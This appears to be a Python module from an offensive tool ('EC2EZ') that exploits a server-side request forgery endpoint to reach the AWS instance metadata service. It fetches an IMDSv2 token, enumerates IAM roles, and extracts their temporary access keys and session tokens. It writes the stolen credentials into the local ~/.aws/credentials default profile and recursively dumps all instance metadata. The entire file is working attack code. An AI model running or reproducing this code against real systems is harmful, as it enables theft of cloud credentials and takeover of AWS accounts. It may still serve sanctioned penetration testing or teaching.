"""
EC2EZ IMDS Module
Handles all IMDSv2 interactions and credential extraction
"""

import json
import os
from pathlib import Path
import requests
from .config import CONFIG
from .utils import log_info, log_success, log_error, log_warning, log


def test_ssrf_vulnerability(proxy_url):
    """
    Test if the SSRF endpoint can reach IMDS

    Args:
        proxy_url: The SSRF proxy URL

    Returns:
        Boolean indicating if SSRF is possible
    """
    try:
        log_info("Testing SSRF vulnerability...")

        test_url = f"{CONFIG.IMDSV2_BASE_URL}/latest/meta-data/"
        full_url = f"{proxy_url}{test_url}"

        response = requests.get(full_url, timeout=CONFIG.HTTP_TIMEOUT)

        # 200 = IMDSv1 accessible, 401 = IMDSv2 (expected)
        if response.status_code in [200, 401]:
            log_success(f"✓ SSRF vulnerability confirmed (status: {response.status_code})")
            if response.status_code == 401:
                log_info("IMDSv2 detected (401 Unauthorized - token required)")
            return True
        else:
            log_error(f"✗ Unexpected status code: {response.status_code}")
            return False

    except requests.RequestException as e:
        log_error(f"✗ SSRF test failed: {str(e)}")
        return False


def fetch_imdsv2_token(proxy_url):
    """
    Fetch IMDSv2 token via SSRF

    Args:
        proxy_url: The SSRF proxy URL

    Returns:
        Token string or None
    """
    try:
        log_info("Fetching IMDSv2 token...")

        token_url = f"{CONFIG.IMDSV2_BASE_URL}{CONFIG.IMDSV2_TOKEN_ENDPOINT}"
        full_url = f"{proxy_url}{token_url}"

        # IMDSv2 requires PUT request with TTL header
        headers = {
            CONFIG.IMDSV2_TOKEN_TTL_HEADER: CONFIG.IMDSV2_TOKEN_TTL
        }

        response = requests.put(full_url, headers=headers, timeout=CONFIG.HTTP_TIMEOUT)

        if response.status_code == 200:
            token = response.text.strip()
            log_success(f"✓ IMDSv2 token obtained (length: {len(token)})")
            log_info(f"Token TTL: {int(CONFIG.IMDSV2_TOKEN_TTL) // 3600} hours")
            return token
        else:
            log_error(f"✗ Failed to fetch token (status: {response.status_code})")
            return None

    except requests.RequestException as e:
        log_error(f"✗ Token fetch failed: {str(e)}")
        return None


def fetch_all_iam_roles(proxy_url, token):
    """
    Fetch all IAM roles from IMDS

    Args:
        proxy_url: The SSRF proxy URL
        token: IMDSv2 token

    Returns:
        List of role names
    """
    try:
        log_info("Enumerating IAM roles...")

        roles_url = f"{CONFIG.IMDSV2_BASE_URL}{CONFIG.IMDSV2_ENDPOINTS['credentials_base']}"
        full_url = f"{proxy_url}{roles_url}"

        headers = {
            CONFIG.IMDSV2_TOKEN_HEADER: token
        }

        response = requests.get(full_url, headers=headers, timeout=CONFIG.HTTP_TIMEOUT)

        if response.status_code == 200:
            # Roles are returned as newline-separated list
            roles = [role.strip() for role in response.text.strip().split('\n') if role.strip()]

            if roles:
                log_success(f"✓ Found {len(roles)} IAM role(s)")
                for role in roles:
                    log(f"  - {role}", color="cyan")
            else:
                log_warning("No IAM roles found")

            return roles
        else:
            log_error(f"✗ Failed to fetch roles (status: {response.status_code})")
            return []

    except requests.RequestException as e:
        log_error(f"✗ Role enumeration failed: {str(e)}")
        return []


def fetch_credentials(proxy_url, token, role):
    """
    Fetch credentials for a specific IAM role

    Args:
        proxy_url: The SSRF proxy URL
        token: IMDSv2 token
        role: IAM role name

    Returns:
        Credentials dict or None
    """
    try:
        log_info(f"Extracting credentials for role: {role}")

        creds_url = f"{CONFIG.IMDSV2_BASE_URL}{CONFIG.IMDSV2_ENDPOINTS['credentials_base']}/{role}"
        full_url = f"{proxy_url}{creds_url}"

        headers = {
            CONFIG.IMDSV2_TOKEN_HEADER: token
        }

        response = requests.get(full_url, headers=headers, timeout=CONFIG.HTTP_TIMEOUT)

        if response.status_code == 200:
            creds = json.loads(response.text)

            log_success("✓ Credentials extracted successfully")
            log(f"  Access Key ID: {creds.get('AccessKeyId', 'N/A')}", color="green")
            log(f"  Secret Access Key: {creds.get('SecretAccessKey', 'N/A')[:20]}...", color="green")
            log(f"  Expiration: {creds.get('Expiration', 'N/A')}", color="yellow")

            return {
                "AccessKeyId": creds.get("AccessKeyId"),
                "SecretAccessKey": creds.get("SecretAccessKey"),
                "Token": creds.get("Token"),
                "Expiration": creds.get("Expiration"),
                "RoleName": role,
            }
        else:
            log_error(f"✗ Failed to fetch credentials (status: {response.status_code})")
            return None

    except requests.RequestException as e:
        log_error(f"✗ Credential extraction failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        log_error(f"✗ Failed to parse credentials JSON: {str(e)}")
        return None


def write_aws_credentials(access_key_id, secret_key, token, region, profile="default"):
    """
    Write credentials to ~/.aws/credentials and config files

    Args:
        access_key_id: AWS access key ID
        secret_key: AWS secret access key
        token: Session token
        region: AWS region
        profile: Profile name (default: "default")
    """
    try:
        log_info("Writing credentials to ~/.aws/credentials...")

        # Ensure .aws directory exists
        aws_dir = Path.home() / ".aws"
        aws_dir.mkdir(exist_ok=True)

        # Write credentials file
        credentials_path = aws_dir / "credentials"
        credentials_content = f"""[{profile}]
aws_access_key_id = {access_key_id}
aws_secret_access_key = {secret_key}
aws_session_token = {token}
"""

        with open(credentials_path, 'w') as f:
            f.write(credentials_content)

        log_success(f"✓ Credentials written to {credentials_path}")

        # Write config file
        config_path = aws_dir / "config"
        config_content = f"""[{profile}]
region = {region}
output = json
"""

        with open(config_path, 'w') as f:
            f.write(config_content)

        log_success(f"✓ Config written to {config_path}")

    except IOError as e:
        log_error(f"✗ Failed to write credentials: {str(e)}")
        raise


def fetch_iam_info(proxy_url, token):
    """
    Fetch IAM info from IMDS

    Args:
        proxy_url: The SSRF proxy URL
        token: IMDSv2 token

    Returns:
        IAM info dict or None
    """
    try:
        log_info("Fetching IAM info...")

        info_url = f"{CONFIG.IMDSV2_BASE_URL}{CONFIG.IMDSV2_ENDPOINTS['iam_info']}"
        full_url = f"{proxy_url}{info_url}"

        headers = {
            CONFIG.IMDSV2_TOKEN_HEADER: token
        }

        response = requests.get(full_url, headers=headers, timeout=CONFIG.HTTP_TIMEOUT)

        if response.status_code == 200:
            info = json.loads(response.text)
            log_success("✓ IAM info retrieved")
            return info
        else:
            log_warning(f"Could not fetch IAM info (status: {response.status_code})")
            return None

    except requests.RequestException as e:
        log_warning(f"IAM info fetch failed: {str(e)}")
        return None
    except json.JSONDecodeError:
        log_warning("Failed to parse IAM info JSON")
        return None


def fetch_metadata(proxy_url, token, path):
    """
    Fetch arbitrary metadata from IMDS

    Args:
        proxy_url: The SSRF proxy URL
        token: IMDSv2 token
        path: Metadata path (e.g., "/latest/meta-data/instance-id")

    Returns:
        Metadata content as string or None
    """
    try:
        metadata_url = f"{CONFIG.IMDSV2_BASE_URL}{path}"
        full_url = f"{proxy_url}{metadata_url}"

        headers = {
            CONFIG.IMDSV2_TOKEN_HEADER: token
        }

        response = requests.get(full_url, headers=headers, timeout=CONFIG.HTTP_TIMEOUT)

        if response.status_code == 200:
            return response.text.strip()
        else:
            return None

    except requests.RequestException:
        return None


def enumerate_imds_recursive(proxy_url, token, base_path="/latest/meta-data/", max_depth=5, current_depth=0):
    """
    Recursively enumerate all IMDS metadata paths

    Args:
        proxy_url: The SSRF proxy URL
        token: IMDSv2 token
        base_path: Starting path
        max_depth: Maximum recursion depth
        current_depth: Current recursion depth

    Returns:
        Dict of path -> value mappings
    """
    if current_depth >= max_depth:
        return {}

    metadata = {}

    try:
        content = fetch_metadata(proxy_url, token, base_path)

        if content is None:
            return metadata

        # Check if this is a directory (ends with / or contains newlines)
        if '\n' in content or base_path.endswith('/'):
            # This is a directory listing
            entries = [entry.strip() for entry in content.split('\n') if entry.strip()]

            for entry in entries:
                new_path = f"{base_path}{entry}" if base_path.endswith('/') else f"{base_path}/{entry}"

                # Recursively fetch
                if entry.endswith('/'):
                    # This is a subdirectory
                    sub_metadata = enumerate_imds_recursive(proxy_url, token, new_path, max_depth, current_depth + 1)
                    metadata.update(sub_metadata)
                else:
                    # This is a file, fetch its content
                    value = fetch_metadata(proxy_url, token, new_path)
                    if value is not None:
                        metadata[new_path] = value
        else:
            # This is a file
            metadata[base_path] = content

    except Exception as e:
        log_warning(f"Error enumerating {base_path}: {str(e)}")

    return metadata
